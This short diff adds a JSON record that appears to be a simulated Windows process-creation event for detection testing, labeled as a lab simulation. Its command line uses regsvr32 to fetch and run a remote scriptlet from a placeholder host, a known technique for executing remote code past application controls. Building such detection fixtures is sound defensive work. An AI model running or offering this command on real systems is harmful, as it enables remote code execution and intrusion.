@@ -1,0 +1,11 @@
+{
+  "event_type": "process_creation",
+  "platform": "windows",
+  "process": {
+    "name": "regsvr32.exe",
+    "command_line": "regsvr32.exe /s /n /u /i:https://example.invalid/payload.sct scrobj.dll"
+  },
+  "user": "lab-user",
+  "host": "lab-windows",
+  "simulation": "regsvr32_remote_scriptlet"
+}
